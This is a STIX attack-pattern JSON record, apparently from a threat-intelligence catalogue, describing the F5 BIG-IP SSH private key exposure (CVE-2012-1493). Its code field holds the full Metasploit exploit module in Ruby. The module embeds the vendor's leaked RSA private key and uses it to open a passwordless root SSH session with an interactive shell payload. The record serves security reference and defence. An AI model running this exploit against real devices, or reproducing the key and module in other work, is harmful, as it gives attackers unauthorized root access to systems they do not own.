{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b7a197cf-3c27-40c8-8f19-628ff875ad4c",
    "created": "2024-08-14T16:58:02.112737Z",
    "modified": "2024-08-14T16:58:02.11274Z",
    "name": "F5 BIG-IP SSH Private Key Exposure",
    "description": " F5 ships a public/private key pair on BIG-IP appliances that allows passwordless authentication to any other BIG-IP box. Since the key is easily retrievable, an attacker can use it to gain unauthorized remote access as root.  'Platform' => 'unix' 'Arch' => ARCH_CMD 'Privileged' => true 'Targets' => [ [ 'Universal', {} ] ] 'Payload' => { 'Compat' => { 'PayloadType' => 'cmd_interact' 'ConnectionType' => 'find'  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/ssh/f5_bigip_known_privkey.rb",
            "external_id": "f5_bigip_known_privkey.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.trustmatta.com/advisories/MATTA-2012-002.txt"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-1493"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2012/06/25/press-f5-for-root-shell"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'net/ssh'\nrequire 'net/ssh/command_stream'\nrequire 'rex/socket/ssh_factory'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::SSH\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'F5 BIG-IP SSH Private Key Exposure',\n        'Description' => %q{\n          F5 ships a public/private key pair on BIG-IP appliances that allows\n          passwordless authentication to any other BIG-IP box. Since the key is\n          easily retrievable, an attacker can use it to gain unauthorized remote\n          access as root.\n        },\n        'Platform' => 'unix',\n        'Arch' => ARCH_CMD,\n        'Privileged' => true,\n        'Targets' => [ [ 'Universal', {} ] ],\n        'Payload' => {\n          'Compat' => {\n            'PayloadType' => 'cmd_interact',\n            'ConnectionType' => 'find'\n          }\n        },\n        'Author' => ['egypt'],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'URL', 'https://www.trustmatta.com/advisories/MATTA-2012-002.txt' ],\n          [ 'CVE', '2012-1493' ],\n          [ 'OSVDB', '82780' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2012/06/25/press-f5-for-root-shell' ]\n        ],\n        'DisclosureDate' => '2012-06-11',\n        'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/interact' },\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        # Since we don't include Tcp, we have to register this manually\n        Opt::RHOST(),\n        Opt::RPORT(22)\n      ], self.class\n    )\n\n    register_advanced_options(\n      [\n        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),\n        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])\n      ]\n    )\n  end\n\n  # helper methods that normally come from Tcp\n  def rhost\n    datastore['RHOST']\n  end\n\n  def rport\n    datastore['RPORT']\n  end\n\n  def do_login(user)\n    opt_hash = ssh_client_defaults.merge({\n      auth_methods: ['publickey'],\n      port: rport,\n      key_data: [ key_data ]\n    })\n\n    opt_hash[:verbose] = :debug if datastore['SSH_DEBUG']\n\n    begin\n      ssh_socket = nil\n      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do\n        ssh_socket = Net::SSH.start(rhost, user, opt_hash)\n      end\n    rescue Rex::ConnectionError\n      return\n    rescue Net::SSH::Disconnect, ::EOFError\n      print_error \"#{rhost}:#{rport} SSH - Disconnected during negotiation\"\n      return\n    rescue ::Timeout::Error\n      print_error \"#{rhost}:#{rport} SSH - Timed out during negotiation\"\n      return\n    rescue Net::SSH::AuthenticationFailed\n      print_error \"#{rhost}:#{rport} SSH - Failed authentication\"\n    rescue Net::SSH::Exception => e\n      print_error \"#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}\"\n      return\n    end\n\n    return false unless ssh_socket\n\n    # Create a new session from the socket, then dump it.\n    conn = Net::SSH::CommandStream.new(ssh_socket)\n    ssh_socket = nil\n    conn\n  end\n\n  def exploit\n    conn = do_login('root')\n    if conn\n      print_good 'Successful login'\n      handler(conn.lsock)\n    end\n  end\n\n  def key_data\n    <<~EOF\n      -----BEGIN RSA PRIVATE KEY-----\n      MIICWgIBAAKBgQC8iELmyRPPHIeJ//uLLfKHG4rr84HXeGM+quySiCRgWtxbw4rh\n      UlP7n4XHvB3ixAKdWfys2pqHD/Hqx9w4wMj9e+fjIpTi3xOdh/YylRWvid3Pf0vk\n      OzWftKLWbay5Q3FZsq/nwjz40yGW3YhOtpK5NTQ0bKZY5zz4s2L4wdd0uQIBIwKB\n      gBWL6mOEsc6G6uszMrDSDRbBUbSQ26OYuuKXMPrNuwOynNdJjDcCGDoDmkK2adDF\n      8auVQXLXJ5poOOeh0AZ8br2vnk3hZd9mnF+uyDB3PO/tqpXOrpzSyuITy5LJZBBv\n      7r7kqhyBs0vuSdL/D+i1DHYf0nv2Ps4aspoBVumuQid7AkEA+tD3RDashPmoQJvM\n      2oWS7PO6ljUVXszuhHdUOaFtx60ZOg0OVwnh+NBbbszGpsOwwEE+OqrKMTZjYg3s\n      37+x/wJBAMBtwmoi05hBsA4Cvac66T1Vdhie8qf5dwL2PdHfu6hbOifSX/xSPnVL\n      RTbwU9+h/t6BOYdWA0xr0cWcjy1U6UcCQQDBfKF9w8bqPO+CTE2SoY6ZiNHEVNX4\n      rLf/ycShfIfjLcMA5YAXQiNZisow5xznC/1hHGM0kmF2a8kCf8VcJio5AkBi9p5/\n      uiOtY5xe+hhkofRLbce05AfEGeVvPM9V/gi8+7eCMa209xjOm70yMnRHIBys8gBU\n      Ot0f/O+KM0JR0+WvAkAskPvTXevY5wkp5mYXMBlUqEd7R3vGBV/qp4BldW5l0N4G\n      LesWvIh6+moTbFuPRoQnGO2P6D7Q5sPPqgqyefZS\n      -----END RSA PRIVATE KEY-----\n    EOF\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-06-11"
}